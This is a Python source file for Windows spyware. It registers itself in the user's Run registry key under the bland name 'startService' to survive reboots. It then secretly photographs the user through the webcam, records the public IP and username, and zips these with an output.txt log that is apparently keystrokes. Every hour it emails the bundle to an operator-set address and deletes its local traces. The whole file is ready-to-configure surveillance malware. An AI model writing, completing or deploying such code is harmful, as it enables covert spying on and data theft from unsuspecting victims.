import subprocess
import getpass
import os
import smtplib
import time
import winreg
from email import encoders
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import pyminizip
import cv2

program_name = "startService"
current_dir = os.path.dirname(os.path.abspath(__file__))
program_path = os.path.join(current_dir, "ellyion.exe")

if not os.path.exists("3.txt"):
    key = winreg.HKEY_CURRENT_USER
    key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"

    with winreg.OpenKey(key, key_path, 0, winreg.KEY_ALL_ACCESS) as registry_key:
        # Add the program to startup
        winreg.SetValueEx(registry_key, program_name, 0, winreg.REG_SZ, program_path)

# Settings for email script side and receiver side
sender_email = " "  # Enter sender email
sender_password = " "  # Enter sender email passwd (preferably an SMTP passwd separate from main account)
receiver_email = " "  # Enter email logs will be sent to, preferably a more private email
subject = "Email with Attachment"
body = "Please find the attached file."

# Password for zip and email server settings
zip_password = " "  # Enter the passwd for the ZIP that you want
smtp_server = " "  # Enter the SMTP email server that you want
server_port = 000 # Enter SMTP server port

file_path = "output.zip"
imput_file = "output.txt"  # Yes I spelt it imput but idc

image = "image.jpg"

def capture_image(filename=image, webcam_index=0):
    # Initialize the webcam
    cap = cv2.VideoCapture(webcam_index)

    # Check if the webcam is opened successfully
    if not cap.isOpened():
        print(" ")
        return

    # Capture a frame from the webcam
    ret, frame = cap.read()

    # Check if the frame is captured successfully
    if not ret:
        print(" ")
        return

    # Release the webcam
    cap.release()

    # Save the captured frame as an image
    cv2.imwrite(filename, frame)
    print(" ", filename)

def send_email(sender_email, sender_password, receiver_email, subject, body, file_path):
    capture_image()
    # Get public IP address
    # Command to fetch the public IP using curl and write it to 1.txt
    txt1 = "1.txt"
    txt2 = "2.txt"

    curl_command = "curl ifconfig.me > 1.txt"
    subprocess.run(curl_command, shell=True, check=True)

    # Use getpass to get the current username and write to 2.txt
    username = getpass.getuser()
    with open(txt2, 'w') as file:
        file.write(username)

    # Define the files to be zipped
    output_file = 'output.txt'

    # Compress both files into a zip file
    pyminizip.compress_multiple([output_file, txt1, txt2, image], [], file_path, zip_password, 9)

    # Create a multipart message
    message = MIMEMultipart()
    message["From"] = sender_email
    message["To"] = receiver_email
    message["Subject"] = subject

    # Attach body to the email
    message.attach(MIMEText(body, "plain"))

    # Open the zip file in binary mode
    with open(file_path, "rb") as attachment:
        # Add file as application/octet-stream
        # Email client can usually download this automatically as attachment
        part = MIMEBase("application", "octet-stream")
        part.set_payload(attachment.read())

    # Encode file in ASCII characters to send via email
    encoders.encode_base64(part)

    # Add header as key/value pair to attachment part
    part.add_header(
        "Content-Disposition",
        f"attachment; filename= {os.path.basename(file_path)}",
    )

    # Add attachment to message and convert message to string
    message.attach(part)
    text = message.as_string()

    # Log in to SMTP server and send email
    with smtplib.SMTP(smtp_server, server_port) as server:
        server.starttls()
        server.login(sender_email, sender_password)
        server.sendmail(sender_email, receiver_email, text)

    # Optionally remove files after sending to clean up
    os.remove(file_path)
    os.remove(output_file)
    os.remove(txt1)
    os.remove(txt2)
    os.remove(image)

# Infinite loop to send email every hour
while True:
    send_email(sender_email, sender_password, receiver_email, subject, body, file_path)
    time.sleep(3600)  # Wait for one hour (3600 seconds) before sending the next email
